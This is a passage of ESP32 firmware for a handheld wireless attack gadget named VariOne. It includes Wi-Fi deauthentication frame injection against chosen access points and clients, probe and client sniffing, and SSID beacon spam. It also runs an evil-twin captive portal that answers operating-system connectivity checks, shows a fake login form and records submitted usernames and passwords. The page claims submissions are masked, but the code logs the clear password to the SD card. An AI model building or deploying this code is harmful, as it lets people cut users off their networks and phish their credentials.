  static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (memcmp(destMAC, broadcast, 6) != 0) {
    sendMgmtFrame(0xC0, apBSSID, destMAC, apBSSID, 7);
    sendMgmtFrame(0xA0, apBSSID, destMAC, apBSSID, 8);
  }
}

const char* deauthModeName(DeauthTargetMode mode) {
  switch (mode) {
    case DEAUTH_MODE_BROADCAST: return "broadcast";
    case DEAUTH_MODE_ALL_DISCOVERED: return "all_discovered";
    case DEAUTH_MODE_SINGLE: return "single";
  }
  return "unknown";
}

// ============================================================
// PROMISCUOUS CALLBACKS
// ============================================================

void IRAM_ATTR packetMonitorCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorActive) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int ch = pkt->rx_ctrl.channel;
  if (ch >= 1 && ch <= 14) channelPackets[ch]++;
  totalPackets++;
}

void IRAM_ATTR probeCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!probeActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28 || frame[0] != 0x40 || len < 26) return;
  uint8_t ssidLen = frame[25];
  if (ssidLen == 0 || ssidLen > 32 || 26 + ssidLen > len) return;
  char ssid[33] = {0};
  memcpy(ssid, &frame[26], ssidLen);
  for (int i = 0; i < probeCount; i++)
    if (strcmp(probes[i].ssid, ssid) == 0 && memcmp(probes[i].mac, &frame[10], 6) == 0) return;
  if (probeCount >= 20) return;
  memcpy(probes[probeCount].ssid, ssid, 33);
  probes[probeCount].rssi = pkt->rx_ctrl.rssi;
  memcpy(probes[probeCount].mac, &frame[10], 6);
  probeCount++;
  triggerReaction(MOOD_HAPPY, "Probe found!", probes[probeCount-1].ssid);
}

void IRAM_ATTR deauthCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!deauthActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  totalMonitored++;
  if (pkt->payload[0] == 0xC0 || pkt->payload[0] == 0xA0) deauthCount++;
}

void IRAM_ATTR clientScanCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!clientScanActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;
  const uint8_t* targetBSSID = wifiNets[deauthTargetIdx].bssid;
  const uint8_t* addr1=&f[4], *addr2=&f[10], *addr3=&f[16];
  const uint8_t* clientMAC = nullptr;
  if (type == WIFI_PKT_DATA) {
    bool toDS=(f[1]&0x01), fromDS=(f[1]&0x02);
    if (!toDS&&!fromDS) { if(memcmp(addr3,targetBSSID,6)==0&&!(addr2[0]&0x01)) clientMAC=addr2; }
    else if (!toDS&&fromDS) { if(memcmp(addr2,targetBSSID,6)==0&&!(addr1[0]&0x01)) clientMAC=addr1; }
    else if (toDS&&!fromDS) { if(memcmp(addr1,targetBSSID,6)==0&&!(addr2[0]&0x01)) clientMAC=addr2; }
  } else {
    if (memcmp(addr3,targetBSSID,6)==0&&memcmp(addr2,targetBSSID,6)!=0&&!(addr2[0]&0x01)) clientMAC=addr2;
    if (!clientMAC&&memcmp(addr2,targetBSSID,6)==0&&memcmp(addr1,targetBSSID,6)!=0&&!(addr1[0]&0x01)) clientMAC=addr1;
  }
  if (!clientMAC||clientCount>=16) return;
  for (int i=0;i<clientCount;i++) if(memcmp(clients[i].mac,clientMAC,6)==0) return;
  memcpy(clients[clientCount].mac,clientMAC,6);
  clients[clientCount].rssi = pkt->rx_ctrl.rssi;
  clientCount++;
}

// === PROMISCUOUS HELPERS ===
void startPromiscuous(wifi_promiscuous_cb_t cb) {
  if (etActive) {
    WiFi.mode(WIFI_AP_STA);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
  }
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(cb);
}
void stopPromiscuous() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

// ============================================================
// VARIPORTAL WEB HANDLERS
// ============================================================

const char* portalMimeType(const char* path) {
  size_t len = strlen(path);
  if (len >= 4 && strcmp(path + len - 4, ".css") == 0) return "text/css";
  if (len >= 3 && strcmp(path + len - 3, ".js") == 0) return "application/javascript";
  if (len >= 4 && strcmp(path + len - 4, ".png") == 0) return "image/png";
  if (len >= 4 && strcmp(path + len - 4, ".jpg") == 0) return "image/jpeg";
  if (len >= 5 && strcmp(path + len - 5, ".jpeg") == 0) return "image/jpeg";
  if (len >= 4 && strcmp(path + len - 4, ".svg") == 0) return "image/svg+xml";
  return "text/html";
}

bool etServeSdAsset(const char* uri) {
  if (!portalThemeIsSd(portalThemeIdx) || strstr(uri, "..")) return false;
  const char* base = portalThemePath(portalThemeIdx);
  char path[96];
  if (strcmp(uri, "/") == 0) snprintf(path, sizeof(path), "%s/index.html", base);
  else snprintf(path, sizeof(path), "%s%s", base, uri);
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  webServer.streamFile(f, portalMimeType(path));
  f.close();
  return true;
}

void etSendBuiltinPortal() {
  const PortalTheme& t = portalThemes[portalThemeIdx < portalThemeCount ? portalThemeIdx : 0];
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent("<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>VariPortal</title><style>");
  webServer.sendContent("*{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#eef1f4;color:#1d252c;font-size:14px}.hdr{color:#fff;padding:14px 16px}.hdr b{display:block;font-size:18px}.hdr span{font-size:12px;opacity:.86}.nav{background:#fff;border-bottom:1px solid #c8ced6;padding:8px 14px;color:#4d5965;font-size:12px}.wrap{display:flex;min-height:330px}.side{width:132px;min-width:132px;background:#f7f8fa;border-right:1px solid #c8ced6;padding:10px}.panel{border:1px solid #aeb6bf;background:#fff}.pt{background:#dde3ea;padding:6px 8px;font-weight:bold;font-size:12px}.pb{padding:8px}.pb label{display:block;font-size:11px;margin:7px 0 3px;color:#34404a}input{width:100%;padding:6px;border:1px solid #98a2ad;border-radius:2px;font-size:13px}button{width:100%;margin-top:9px;border:0;color:#fff;padding:7px;font-weight:bold}.main{flex:1;background:#fff}.hero{height:118px;background:#d8dee6;display:flex;align-items:center;justify-content:center;color:#66717e}.bar{color:#fff;padding:7px 12px;font-size:13px}.content{padding:12px;color:#4d5965;line-height:1.4}.notice{border-top:1px solid #d6dce3;margin-top:12px;padding-top:10px;font-size:11px;color:#66717e}.ft{text-align:center;background:#f7f8fa;border-top:1px solid #d6dce3;padding:8px;color:#66717e;font-size:10px}@media(max-width:520px){.wrap{display:block}.side{width:100%;border-right:0;border-bottom:1px solid #c8ced6}.hero{height:84px}}</style></head><body>");
  webServer.sendContent("<div class=\"hdr\" style=\"background:");
  webServer.sendContent(t.accent);
  webServer.sendContent("\"><b>");
  webServer.sendContent(t.title);
  webServer.sendContent("</b><span>");
  webServer.sendContent(t.subtitle);
  webServer.sendContent("</span></div><div class=\"nav\">Status &nbsp; Access &nbsp; Help</div><div class=\"wrap\"><div class=\"side\"><div class=\"panel\"><div class=\"pt\">");
  webServer.sendContent(t.panel);
  webServer.sendContent("</div><div class=\"pb\"><form action=\"/login\" method=\"POST\"><label>");
  webServer.sendContent(t.userLabel);
  webServer.sendContent("</label><input type=\"text\" name=\"u\" autocomplete=\"off\" required><label>");
  webServer.sendContent(t.passLabel);
  webServer.sendContent("</label><input type=\"password\" name=\"p\" autocomplete=\"off\" required><button style=\"background:");
  webServer.sendContent(t.accent);
  webServer.sendContent("\" type=\"submit\">");
  webServer.sendContent(t.button);
  webServer.sendContent("</button></form></div></div></div><div class=\"main\"><div class=\"hero\">Network session check</div><div class=\"bar\" style=\"background:");
  webServer.sendContent(t.accent);
  webServer.sendContent("\">Connection Required</div><div class=\"content\">Enter the lab-provided demo values to continue this cybersecurity awareness exercise.<div class=\"notice\">Training build: submissions are masked on-device and stored for demonstration review only.</div></div></div></div><div class=\"ft\">VariOne education portal - bundled generic theme</div></body></html>");
  webServer.sendContent("");
}

void etServePortal() {
  logHeap("portal request");
  Serial.printf("[PORTAL] GET host=%s uri=%s\n",
                webServer.hostHeader().c_str(),
                webServer.uri().c_str());
  if (etServeSdAsset("/")) return;
  etSendBuiltinPortal();
}

void etHandleLogin() {
  String user = webServer.arg("u");
  String pass = webServer.arg("p");
  strncpy(etLastUser, user.c_str(), 32);
  etLastUser[32] = '\0';
  if (PORTAL_SHOW_CLEAR_PASSWORD) {
    strncpy(etLastPass, pass.c_str(), sizeof(etLastPass) - 1);
    etLastPass[sizeof(etLastPass) - 1] = '\0';
  } else {
    maskSecret(pass.c_str(), etLastPass, sizeof(etLastPass));
  }
  etCredCount++;
  lastEtDraw = 0; // force immediate OLED refresh on next loop tick
  Serial.printf("\n[PORTAL] === DEMO SUBMISSION #%d ===\n", etCredCount);
  Serial.printf("[PORTAL] User: %s\n", etLastUser);
  Serial.printf("[PORTAL] Pass %s: %s\n\n",
                PORTAL_SHOW_CLEAR_PASSWORD ? "clear" : "masked",
                etLastPass);
  sdLogCred(etLastUser, pass.c_str());
  triggerReaction(MOOD_SUCCESS, "Demo saved", etLastUser);
  webServer.send_P(200, "text/html", ET_SUCCESS);
}

void etServeCaptiveProbe() {
  logHeap("portal captive");
  Serial.printf("[PORTAL] CAPTIVE host=%s uri=%s\n",
                webServer.hostHeader().c_str(),
                webServer.uri().c_str());
  if (etServeSdAsset("/")) return;
  etSendBuiltinPortal();
}

void etRedirect() {
  webServer.sendHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  webServer.sendHeader("Location", "http://192.168.4.1/", true);
  webServer.send(302, "text/plain", "");
}

void etHandleAsset() {
  if (!etServeSdAsset(webServer.uri().c_str())) etRedirect();
}

void etHandleNotFound() {
  Serial.printf("[PORTAL] NOTFOUND host=%s uri=%s\n",
                webServer.hostHeader().c_str(),
                webServer.uri().c_str());
  if (etServeSdAsset(webServer.uri().c_str())) return;
  etServeCaptiveProbe();
}

void etSetupWebServer() {
  webServer.on("/", HTTP_GET, etServePortal);
  webServer.on("/index.html", HTTP_GET, etServePortal);
  webServer.on("/style.css", HTTP_GET, etHandleAsset);
  webServer.on("/login", HTTP_POST, etHandleLogin);
  webServer.on("/generate_204",              HTTP_GET, etServeCaptiveProbe);
  webServer.on("/gen_204",                   HTTP_GET, etServeCaptiveProbe);
  webServer.on("/generate204",               HTTP_GET, etServeCaptiveProbe);
  webServer.on("/hotspot-detect.html",       HTTP_GET, etServeCaptiveProbe);
  webServer.on("/library/test/success.html", HTTP_GET, etServeCaptiveProbe);
  webServer.on("/connecttest.txt",           HTTP_GET, etServeCaptiveProbe);
  webServer.on("/ncsi.txt",                  HTTP_GET, etServeCaptiveProbe);
  webServer.on("/fwlink",                    HTTP_GET, etServeCaptiveProbe);
  webServer.on("/canonical.html",            HTTP_GET, etServeCaptiveProbe);
  webServer.on("/success.txt",               HTTP_GET, etServeCaptiveProbe);
  webServer.on("/connectivity-check.html",   HTTP_GET, etServeCaptiveProbe);
  webServer.on("/mobile/status.php",         HTTP_GET, etServeCaptiveProbe);
  webServer.on("/redirect",                  HTTP_GET, etServeCaptiveProbe);
  webServer.onNotFound(etHandleNotFound);
  webServer.begin();
}

// ============================================================
// DRAWING HELPERS
// ============================================================

const char* menuTags[] = {
  "Wi", "RF", "NF", "IR", "ID"
};

MoodType menuMoodForIndex(int idx) {
  switch (idx) {
    case 4: return MOOD_ANGRY;
    case 5: return MOOD_HAPPY;
    case 6: return MOOD_WORKING;
    case 8: return MOOD_WORKING;
    case 9: return MOOD_THINKING;
    case 10: return MOOD_THINKING;
    case 11: return MOOD_HAPPY;
    default: return MOOD_THINKING;
  }
}

void drawHeader(const char* title) {
  display.setDrawColor(1);
  display.drawBox(0, 0, 128, 13);
  display.setDrawColor(0);
  display.setFont(u8g2_font_6x10_tf);
  char shortTitle[15];
  snprintf(shortTitle, sizeof(shortTitle), "%.14s", title);
  display.drawStr(2, 10, shortTitle);
  display.setFont(u8g2_font_4x6_tr);
  if (deauthAttackActive) display.drawStr(94, 8, "TX");
  if (etActive) display.drawStr(106, 8, "AP");
  display.drawStr(118, 8, sdAvailable ? "SD" : "--");
  display.setDrawColor(1);
}

void drawControls(const char* text) {
  if (currentState != STATE_SUBGHZ &&
      currentState != STATE_SUBGHZ_PICKER &&
      currentState != STATE_SUBGHZ_FREQSCAN &&
      currentState != STATE_SUBGHZ_ROLLJAM &&
      currentState != STATE_NFC_MENU &&
      currentState != STATE_NFC_SAVED) {
    return;
  }
  display.setDrawColor(1);
  display.drawBox(0, 56, 128, 8);
  display.setDrawColor(0);
  display.setFont(u8g2_font_5x7_tr);
  char line[26];
  snprintf(line, sizeof(line), "%.25s", text);
  display.drawStr(2, 63, line);
  display.setDrawColor(1);
}

void drawScrollBar(int first, int total, int visible) {
  if (total <= visible || visible <= 0) return;
  int trackY = 16;
  int trackH = 39;
  int thumbH = max(6, (trackH * visible) / total);
  int maxFirst = max(1, total - visible);
  int thumbY = trackY + ((trackH - thumbH) * first) / maxFirst;
  display.drawVLine(126, trackY, trackH);
  display.drawBox(124, thumbY, 4, thumbH);
}

void drawWifiBars(int x, int y, int rssi) {
  int bars = 1;
  if (rssi > -80) bars = 2;
  if (rssi > -68) bars = 3;
  if (rssi > -55) bars = 4;
  for (int i = 0; i < 4; i++) {
    int h = 2 + (i * 2);
    display.drawFrame(x + i * 4, y - h, 3, h);
    if (i < bars) display.drawBox(x + i * 4, y - h, 3, h);
  }
}

void drawTinyProgress(int x, int y, int w, int value, int maxValue) {
  int fill = maxValue > 0 ? constrain(map(value, 0, maxValue, 0, w - 2), 0, w - 2) : 0;
  display.drawFrame(x, y, w, 7);
  display.drawBox(x + 1, y + 1, fill, 5);
}

void drawLiveDots(int x, int y) {
  int dots = (millis() / 250) % 4;
  for (int i = 0; i < 3; i++) {
    if (i < dots) display.drawDisc(x + i * 6, y, 2);
    else display.drawCircle(x + i * 6, y, 2);
  }
}

// ============================================================
// SCREEN DRAW FUNCTIONS
// ============================================================

void drawMenu() {
  display.clearBuffer();
  drawHeader("VariOne");
  display.setFont(u8g2_font_5x8_tr);
  int startIdx = menuIndex - 2;
  if (startIdx < 0) startIdx = 0;
  if (startIdx > menuCount - 5) startIdx = max(0, menuCount - 5);
  for (int i = 0; i < 5; i++) {
    int idx = startIdx + i;
    if (idx >= menuCount) break;
    int y = 21 + (i * 9);
    if (idx == menuIndex) {
      display.drawBox(0, y - 7, 128, 9);
      display.setDrawColor(0);
      char line[24]; snprintf(line, sizeof(line), "> %.18s", menuItems[idx]);
      display.drawStr(3, y, line);
      display.drawStr(112, y, menuTags[idx]);
      display.setDrawColor(1);
    } else {
      char line[24]; snprintf(line, sizeof(line), "  %.18s", menuItems[idx]);
      display.drawStr(3, y, line);
      display.drawStr(112, y, menuTags[idx]);
    }
  }
  drawScrollBar(startIdx, menuCount, 5);
  display.sendBuffer();
}

void drawWifiMenu() {
  display.clearBuffer();
  drawHeader("Wi-Fi");
  display.setFont(u8g2_font_5x8_tr);
  if (wifiMenuIndex < wifiMenuScroll) wifiMenuScroll = wifiMenuIndex;
  if (wifiMenuIndex >= wifiMenuScroll + 5) wifiMenuScroll = wifiMenuIndex - 4;
  for (int row = 0; row < 5; row++) {
    int idx = wifiMenuScroll + row;
    if (idx >= wifiMenuCount) break;
    int y = 21 + row * 9;
    if (idx == wifiMenuIndex) {
      display.drawBox(0, y - 7, 128, 9);
      display.setDrawColor(0);
      char line[24]; snprintf(line, sizeof(line), "> %.20s", wifiMenuItems[idx]);
      display.drawStr(3, y, line);
      display.setDrawColor(1);
    } else {
      char line[24]; snprintf(line, sizeof(line), "  %.20s", wifiMenuItems[idx]);
      display.drawStr(3, y, line);
    }
  }
  drawScrollBar(wifiMenuScroll, wifiMenuCount, 5);
  display.sendBuffer();
}

void drawWifiResults() {
  display.clearBuffer();
  char hdr[24]; snprintf(hdr,sizeof(hdr),"WiFi (%d)",wifiCount);
  drawHeader(hdr);
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(10, 34, "No networks found");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(10, 47, "Move closer / retry");
    drawMascot(104, 34, MOOD_SAD);
    drawControls("bk:back");
    display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = wifiScroll + i;
    if (idx >= wifiCount) break;
    int y = 24 + (i * 8);
    const char* lock = (wifiNets[idx].encryption != WIFI_AUTH_OPEN) ? "L" : "O";
    String name = wifiNets[idx].ssid;
    if (!name.length()) name = "(hidden)";
    if (name.length() > 13) name = name.substring(0,12) + "~";
    char line[32];
    snprintf(line,sizeof(line),"%s %-13s ch%02d",lock,name.c_str(),wifiNets[idx].channel);
    display.drawStr(2, y, line);
    drawWifiBars(105, y, wifiNets[idx].rssi);
  }
  drawScrollBar(wifiScroll, wifiCount, 4);
  drawControls("up/dn scroll  bk back");
  display.sendBuffer();
}

void drawPacketMonitor() {
  display.clearBuffer();
  char hdr[28]; snprintf(hdr,sizeof(hdr),"PktMon: %d pkts",totalPackets);
  drawHeader(hdr);
  int graphY=17,graphH=38,barW=8,maxPkts=1;
  for (int ch=1;ch<=14;ch++) {
    if(channelPackets[ch]>maxPkts) maxPkts=channelPackets[ch];
    if(channelPeaks[ch]>maxPkts) maxPkts=channelPeaks[ch];
  }
  for (int ch=1;ch<=14;ch++) {
    int x=(ch-1)*9+2;
    int barH=constrain(map(channelPackets[ch],0,maxPkts,0,graphH),0,graphH);
    display.drawBox(x,graphY+graphH-barH,barW,barH);
    int peakH=map(channelPeaks[ch],0,maxPkts,0,graphH);
    if(peakH>0) display.drawHLine(x,graphY+graphH-peakH,barW);
    if(channelPackets[ch]>channelPeaks[ch]) channelPeaks[ch]=channelPackets[ch];
  }
  display.setFont(u8g2_font_4x6_tr);
  for (int ch=1;ch<=14;ch++) {
    char num[3]; snprintf(num,sizeof(num),"%d",ch);
    display.drawStr((ch-1)*9+3,62,num);
  }
  display.sendBuffer();
}

void drawProbeSniffer() {
  display.clearBuffer();
  char hdr[24]; snprintf(hdr,sizeof(hdr),"Probes (%d)",probeCount);
  drawHeader(hdr);
  if (probeCount == 0) {
    drawMascot(22, 32, MOOD_WORKING);
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,31,"Listening");
    drawLiveDots(9, 43);
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,53,"phone probe reqs");
    drawControls("bk:stop"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=probeScroll+i; if(idx>=probeCount) break;
    char line[32];
    snprintf(line,sizeof(line),"%02X:%02X %-17s",probes[idx].mac[4],probes[idx].mac[5],probes[idx].ssid);
    display.drawStr(2,24+(i*8),line);
  }
  drawScrollBar(probeScroll, probeCount, 4);
  drawControls("up/dn scroll  bk stop");
  display.sendBuffer();
}

void drawDeauthDetector() {
  display.clearBuffer(); drawHeader("Deauth Detector");
  display.setFont(u8g2_font_6x10_tr);
  char stat[28]; snprintf(stat,sizeof(stat),"Monitoring: %lus",(millis()-deauthStart)/1000);
  display.drawStr(4,25,stat);
  if (deauthCount > 0) {
    drawMascot(108, 33, MOOD_ANGRY);
    display.setFont(u8g2_font_helvB12_tr);
    char alert[20]; snprintf(alert,sizeof(alert),"!! %d !!",deauthCount);
    display.drawStr(6,44,alert);
    display.setFont(u8g2_font_5x8_tr); display.drawStr(6,54,"DEAUTH DETECTED");
  } else {
    drawMascot(108, 33, MOOD_THINKING);
    display.setFont(u8g2_font_6x10_tr); display.drawStr(6,39,"All clear");
    char pkts[24]; snprintf(pkts,sizeof(pkts),"%d frames checked",totalMonitored);
    display.setFont(u8g2_font_5x8_tr); display.drawStr(6,51,pkts);
  }
  drawControls("ok:deauth  bk:stop"); display.sendBuffer();
}

void drawDeauthTargetSelect() {
  display.clearBuffer(); drawHeader("Pick Target AP");
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"No scan data!");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Run AP Scan first");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=deauthTargetScroll+i; if(idx>=wifiCount) break;
    int y=24+(i*8);
    String name=wifiNets[idx].ssid; if(!name.length()) name="(hidden)";
    if(name.length()>13) name=name.substring(0,12)+"~";
    if (idx==deauthTargetIdx) {
      display.drawBox(0,y-7,124,8); display.setDrawColor(0);
      char line[32]; snprintf(line,sizeof(line),">%-13s ch%02d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line); display.setDrawColor(1);
    } else {
      char line[32]; snprintf(line,sizeof(line)," %-13s ch%02d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line);
    }
    drawWifiBars(105, y, wifiNets[idx].rssi);
  }
  drawScrollBar(deauthTargetScroll, wifiCount, 4);
  drawControls("up/dn:nav ok:scan bk:back"); display.sendBuffer();
}

void drawClientScan() {
  display.clearBuffer(); drawHeader("Finding Clients");
  String name=wifiNets[deauthTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>18) name=name.substring(0,17)+"~";
  drawMascot(108, 35, MOOD_WORKING);
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,25,name.c_str());
  unsigned long elapsed=millis()-clientScanStart;
  int secondsLeft = (CLIENT_SCAN_MS - constrain(elapsed,0,CLIENT_SCAN_MS) + 999) / 1000;
  int progress=map(constrain(elapsed,0,CLIENT_SCAN_MS),0,CLIENT_SCAN_MS,0,78);
  display.drawFrame(4,31,80,9); display.drawBox(5,32,progress,7);
  char found[24]; snprintf(found,sizeof(found),"Found: %d client(s)",clientCount);
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,50,found);
  char left[12]; snprintf(left,sizeof(left),"%ds",secondsLeft);
  display.drawStr(88,38,left);
  drawControls("bk:skip"); display.sendBuffer();
}

void drawClientSelect() {
  display.clearBuffer(); drawHeader("Pick Client");
  int totalRows=clientCount+2;
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=clientSelectScroll+i; if(idx>=totalRows) break;
    int y=24+(i*8); char line[32];
    if(idx==0) snprintf(line,sizeof(line)," Broadcast all");
    else if(idx==1) snprintf(line,sizeof(line)," All found (%d)",clientCount);
    else { int ci=idx-2; snprintf(line,sizeof(line)," %02X:%02X:%02X %ddBm",clients[ci].mac[3],clients[ci].mac[4],clients[ci].mac[5],clients[ci].rssi); }
    if(idx==clientSelectIdx) {
      display.drawBox(0,y-7,124,8); display.setDrawColor(0);
      line[0]='>'; display.drawStr(2,y,line); display.setDrawColor(1);
    } else display.drawStr(2,y,line);
  }
  drawScrollBar(clientSelectScroll, totalRows, 4);
  drawControls("up/dn:mode ok:atk bk:back"); display.sendBuffer();
}

void drawDeauthConfirm() {
  display.clearBuffer(); drawHeader("Confirm Deauth");
  String name=wifiNets[deauthTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>15) name=name.substring(0,14)+"~";
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(4,23,name.c_str());
  if(attackMode == DEAUTH_MODE_BROADCAST) display.drawStr(4,33,"mode: Broadcast");
  else if(attackMode == DEAUTH_MODE_ALL_DISCOVERED) display.drawStr(4,33,"mode: All found");
  else {
    char mac[22]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",attackClientMAC[0],attackClientMAC[1],attackClientMAC[2],attackClientMAC[3],attackClientMAC[4],attackClientMAC[5]);
    display.drawStr(2,33,mac);
  }
  drawMascot(108, 34, MOOD_ANGRY);
  unsigned long held = deauthConfirmHoldStart ? millis() - deauthConfirmHoldStart : 0;
  drawTinyProgress(4, 40, 78, constrain(held, 0UL, (unsigned long)DEAUTH_CONFIRM_HOLD_MS), DEAUTH_CONFIRM_HOLD_MS);
  display.drawStr(4,55,"Hold OK to start");
  drawControls("hold ok:start bk:cancel"); display.sendBuffer();
}

void drawDeauthAttack() {
  display.clearBuffer(); drawHeader("Deauth Attack");
  String name=wifiNets[deauthTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>16) name=name.substring(0,15)+"~";
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,24,name.c_str());
  if(attackMode == DEAUTH_MODE_BROADCAST) { display.drawStr(4,34,"mode: Broadcast"); }
  else if(attackMode == DEAUTH_MODE_ALL_DISCOVERED) { display.drawStr(4,34,"mode: All found"); }
  else {
    char mac[22]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",attackClientMAC[0],attackClientMAC[1],attackClientMAC[2],attackClientMAC[3],attackClientMAC[4],attackClientMAC[5]);
    display.drawStr(2,34,mac);
  }
  int elapsed = millis() - deauthAttackStart;
  drawTinyProgress(4, 39, 74, elapsed, DEAUTH_ATTACK_MS);
  drawMascot(108, 34, MOOD_ANGRY);
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(82,45,"OK/FAIL");
  display.setFont(u8g2_font_6x10_tr);
  char fc[20]; snprintf(fc,sizeof(fc),"%d/%d",deauthTxOk,deauthTxFail);
  display.drawStr(4,54,fc);
  drawControls(etActive ? "portal+deauth bk:stop" : "bk:stop"); display.sendBuffer();
}

void drawBeaconSpam() {
  display.clearBuffer(); drawHeader("SSID Spam");
  display.setFont(u8g2_font_5x8_tr);
  char ssidLine[24]; snprintf(ssidLine,sizeof(ssidLine),"%.22s",spamSSIDs[beaconSSIDIdx]);
  display.drawStr(2,25,ssidLine);
  char idxLine[24]; snprintf(idxLine,sizeof(idxLine),"SSID %d/%d  ch%d",beaconSSIDIdx+1,spamSSIDCount,beaconChannels[beaconChannelIdx]);
  display.drawStr(2,36,idxLine);
  drawTinyProgress(2, 42, 70, beaconSSIDIdx + 1, spamSSIDCount);
  drawMascot(108, 34, MOOD_HAPPY);
  display.setFont(u8g2_font_6x10_tr);
  char fc[20]; snprintf(fc,sizeof(fc),"%d sent",beaconFrameCount);
  display.drawStr(2,54,fc);
  drawControls("bk:stop"); display.sendBuffer();
}

void drawEvilTwinTarget() {
  display.clearBuffer(); drawHeader("VariPortal: AP");
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"No scan data!");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Run AP Scan first");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=etTargetScroll+i; if(idx>=wifiCount) break;
    int y=24+(i*8);
    String name=wifiNets[idx].ssid; if(!name.length()) name="(hidden)";
    if(name.length()>13) name=name.substring(0,12)+"~";
    if(idx==etTargetIdx) {
      display.drawBox(0,y-7,124,8); display.setDrawColor(0);
      char line[32]; snprintf(line,sizeof(line),">%-13s ch%02d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line); display.setDrawColor(1);
    } else {
      char line[32]; snprintf(line,sizeof(line)," %-13s ch%02d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line);
    }
    drawWifiBars(105, y, wifiNets[idx].rssi);
  }
  drawScrollBar(etTargetScroll, wifiCount, 4);
  drawControls("up/dn:nav ok:start bk:back"); display.sendBuffer();
}

void drawEvilTwinRunning() {
  display.clearBuffer(); drawHeader("VariPortal");
  display.setFont(u8g2_font_5x8_tr);
  String name=wifiNets[etTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>15) name=name.substring(0,14)+"~";
  display.drawStr(2,24,name.c_str());
  char info[24]; snprintf(info,sizeof(info),"192.168.4.1 ch%d",wifiNets[etTargetIdx].channel);
  display.drawStr(2,34,info);
  drawMascot(108, 34, etCredCount ? MOOD_SUCCESS : MOOD_WORKING);
  if(etCredCount==0) { display.drawStr(2,45,"Waiting for client"); drawLiveDots(72,43); }
  else { char cl[24]; snprintf(cl,sizeof(cl),"Demo:%d %.12s",etCredCount,etLastUser); display.drawStr(2,45,cl); }
  char cts[24]; snprintf(cts,sizeof(cts),"Clients: %d",WiFi.softAPgetStationNum());
  display.drawStr(2,54,cts);
  if (deauthAttackActive) {
    char df[22]; snprintf(df,sizeof(df),"D:%d",deauthFrameCount);
    display.drawStr(68,54,df);
  }
  drawControls("ok deauth  bk stop"); display.sendBuffer();
}

void drawPortalTheme() {
  display.clearBuffer(); drawHeader("Portal Theme");
  display.setFont(u8g2_font_5x8_tr);
  int total = portalThemeTotal();
  for (int row = 0; row < 4; row++) {
    int i = portalThemeScroll + row;
    if (i >= total) break;
    int y = 24 + (row * 8);
    char line[28];
    snprintf(line, sizeof(line), " %.22s", portalThemeName(i));
    if (i == portalThemeIdx) {
      display.drawBox(0, y - 7, 124, 8);
      display.setDrawColor(0);
      line[0] = '>';
      display.drawStr(2, y, line);
      display.setDrawColor(1);
    } else {
      display.drawStr(2, y, line);
    }
  }
  drawScrollBar(portalThemeScroll, total, 4);
  drawControls(sdPortalThemeCount ? "built-in+SD ok:save" : "up/dn:pick ok:save");
  display.sendBuffer();
}

